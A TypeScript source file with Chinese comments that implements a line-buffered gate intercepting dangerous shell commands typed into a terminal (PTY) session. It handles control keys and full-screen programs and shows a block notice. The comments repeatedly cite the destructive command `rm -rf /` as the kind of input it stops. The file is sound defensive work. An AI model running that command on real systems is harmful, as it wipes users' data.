   * block 时的提示文案。**只能走输出通道**（terminal:data）渲染到屏幕上：
   * 它是回显给用户看的，不是给用户敲的。写进 PTY stdin 等于把提示里的文本
   * 连 `\r\n` 一起交给 shell 执行。
   */
  notice?: string
  /** block 时的判定原因，供审计日志 */
  reason?: string
  /** 被拦下的那一行（已截断，供审计日志） */
  line?: string
}

/**
 * 拦下一条命令后往 PTY **stdin** 发的字节：Ctrl-C（弃掉当前输入行）。
 *
 * 为什么必须发：键入阶段的字符是逐个放行的，shell 的行缓冲里已经躺着 `rm -rf /`。
 * 我们只是没把 `\r` 转过去，命令还没执行，但用户再按一次回车就会执行 —— 那比不拦更糟。
 *
 * 为什么是 `\x03` 而不是 `\x15`（Ctrl-U）：Ctrl-U 是 readline 的行首丢弃，
 * bash/zsh 认，cmd.exe 与不带 PSReadLine 的 PowerShell 不认（实测拦完之后再敲 echo
 * 会和残留的 `rm -rf /` 拼成一行执行）。Ctrl-C 在三边都是"放弃当前这一行"。
 * 拦的这一刻用户必然停在提示符上（判定发生在回车时），不会有前台程序被误中断。
 *
 * 拦截提示**不能**走 stdin（那会被 shell 当成输入、里面的换行会真的执行），
 * 必须走输出通道渲染到屏幕上，见 `LineGateVerdict.notice` 的用法注释。
 */
export const PTY_ABANDON_LINE = '\x03'

/**
 * PTY 逐键写入的风险闸 —— 行缓冲模式
 *
 * 为什么不在逐字符阶段判：键入是逐字符到达的，"rm"→"rm "→"rm -"每敲一个字母判一次
 * 会灾难性误拦。`\r` 在 PTY 语义里就是 accept-line，是唯一"命令完整了"的时刻。
 *
 * 覆盖范围（按通道能看见什么来写，不吹）：
 * - 手工键入：输入流经此，回车时整行判 —— 覆盖
 * - 粘贴多行：一次 write 里带多个行分隔符，逐行判 —— 覆盖
 * - ↑ 历史回溯：**不覆盖**。readline 把历史命令写到输出侧回显，输入通道只收到
 *   `\x1b[A`，命令文本根本不经过这里。要拦这一类得让 shell 集成在 preexec 里报
 *   OSC 633;E，但那时命令已经在执行路上，只能记审计不能阻止。
 *
 * 全屏程序（vim/less/nano/htop）期间暂停判定：否则在 vim 插入模式里打一行
 * "rm -rf /" 会被当成 shell 命令拦下，并把提示写进文件内容里。备用屏状态从
 * **输出流**观察（`observeOutput`），因为进出全屏是程序写给终端的指令。
 */
export class LineGate {
  private buffer = ''
  private inAltScreen = false

  /** 喂入 PTY 输出流：只用于跟踪备用屏，不做任何拦截 */
  observeOutput(data: string): void {
    if (ALT_SCREEN_ON.test(data)) this.inAltScreen = true
    if (ALT_SCREEN_OFF.test(data)) {
      this.inAltScreen = false
      this.buffer = ''
    }
  }

  feed(data: string): LineGateVerdict {
    // 全屏程序里：不判、不清累计，原样放行
    if (this.inAltScreen) return { allow: true }

    // Ctrl-C（中断当前输入）与 Ctrl-D（EOF）：清缓冲后放行，交给 shell 自己处理
    if (/[\x03\x04]/.test(data)) {
      this.buffer = ''
      return { allow: true }
    }
    // Ctrl-U / Ctrl-W：清行 / 回退一个词 —— 同步把缓冲缩回去，否则会拿已删掉的字符判
    if (data.includes('\x15')) this.buffer = ''
    if (data.includes('\x17')) this.buffer = this.buffer.replace(/\S*\s*$/, '')
    // 退格
    const backspaces = (data.match(/\x7f|\x08/g) ?? []).length
    if (backspaces > 0) this.buffer = this.buffer.slice(0, Math.max(0, this.buffer.length - backspaces))

    const clean = data.replace(INPUT_ESCAPE_SEQUENCE, '').replace(CONTROL_JUNK, '')
    if (!clean) return { allow: true }
    this.buffer += clean

    // 还没回车：整段都是未完成的行，放行
    const sepIdx = Math.max(this.buffer.lastIndexOf('\r'), this.buffer.lastIndexOf('\n'))
    if (sepIdx === -1) return { allow: true }

    const completed = this.buffer.slice(0, sepIdx)
    // 分隔符之后是"下一行的开头"，继续留着
    this.buffer = this.buffer.slice(sepIdx + 1)

    for (const line of completed.split(/\r\n|\r|\n/)) {
      const text = line.trim()
      if (!text) continue
      const verdict = evaluateCommand(text)
      if (verdict.level === 'block') {
        // 整段写入都不转发，缓冲区也不能留残余，否则下一次按键会拿旧行重复判
        this.buffer = ''
        return {
          allow: false,
          reason: verdict.reason,
          line: text.slice(0, 120),
          notice:
            '\r\n\x1b[31m⛔ 已拦截高危命令\x1b[0m\r\n' +
            `   命令：${text.slice(0, 120)}\r\n` +
            `   原因：${verdict.reason}\r\n` +
            '   该命令没有执行，可以直接继续输入\r\n\r\n',
        }
      }
    }
    return { allow: true }
  }

  /** 会话关闭/切换、或代写路径清了行时调用 */
  reset(): void {
    this.buffer = ''
  }

  /** 当前是否在备用屏（判据与调试用） */
  get paused(): boolean {
    return this.inAltScreen
  }
}
